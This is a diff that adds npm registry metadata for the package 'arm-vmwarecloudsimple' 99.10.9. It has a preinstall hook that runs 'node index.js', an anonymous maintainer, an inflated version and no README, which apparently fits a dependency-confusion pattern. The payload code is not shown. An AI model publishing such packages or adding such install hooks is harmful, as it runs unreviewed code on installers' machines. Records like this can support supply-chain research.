@@ -1,0 +1,62 @@
+{
+    "_id": "arm-vmwarecloudsimple",
+    "name": "arm-vmwarecloudsimple",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "arm-vmwarecloudsimple",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "arm-vmwarecloudsimple@99.10.9",
+            "_nodeVersion": "14.16.1",
+            "_npmVersion": "6.14.11",
+            "dist": {
+                "integrity": "sha512-+un4o53G0fERwu0ngbW3cCyi0dpviKGtD/QhQSWvzAwwN2BmpVdYbSI3qK3m3i0VPPR5LtWBeJlsUMqHQsuacw==",
+                "shasum": "50d2b9c755523069b2b2c0f1a181137885a4883f",
+                "tarball": "https://registry.npmjs.org/arm-vmwarecloudsimple/-/arm-vmwarecloudsimple-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5070,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiNa98ACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2Vmp4YA/+P12Z328nRxUHFhvhh5yZDmXwFP1Vj1pzeJvU9aBVm0OJubLm\r\ntUFT4jJb/o3Z2iMZr+u+UYTKe+cLn5ZPc/mAIfRa9dMYHJdSIcSS6951iBUz\r\nHUo8KGQUzreIdNTXzmfc2lUW9v/TnTwYwol58W0JA75UThLfA3qINdot7MY2\r\nbEkG7p+Ott9H38ns1HVcFiT4Kruchwf0ZQT4Ul+e+YynFPl604v9vm7OgnpP\r\nsqoIsqCFDIBcVDtfokicHBUoPA/WTdcK7Mi5n+uWoyihuh5I85+TrurCaH0t\r\nC01dI8gh4G4lDsHBvruvywudf0frsH1sup4m3xeNM6PNPJF2LN8PdkCI8zrQ\r\nMrJVSSXvRi4yWa9Trqp6ttk0OrHE+EsYh7mLEpiyG6+ZQYw1sYcVAAnB4c3L\r\n+N21rp8fq0KSI9mI/zzUtWK/35Sw33t6cWeBWA7E37KnLlYwslflyHfd5Q3P\r\nz8nZPX3vt8vecUetvra2yttwq3Pq6O+HBDSHNVkGcr4AYpjSGlnuBNN0Kuwn\r\nnbCaYoTX9v3aKfFNlsOvWsnIWYTYqafqzaRVX4dZNc5wqeS46Rygr3xN9ktB\r\n0GBWKF4Rsvhj4d2YgeIJJiHsmFqS1hjbr3a2OVpeJp9fWWZVzf68M75b3SY0\r\nl5wNZPt7JTSm2PYJykf3HLWTQom4PdSK7PI=\r\n=VlAk\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "1ucgklxy",
+                "email": "1ucgklxy@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "1ucgklxy",
+                    "email": "1ucgklxy@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/arm-vmwarecloudsimple_99.10.9_1647685499968_0.02498272959426484"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-19T10:24:59.967Z",
+        "99.10.9": "2022-03-19T10:25:00.091Z",
+        "modified": "2022-03-19T10:25:00.166Z"
+    },
+    "maintainers": [
+        {
+            "name": "1ucgklxy",
+            "email": "1ucgklxy@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
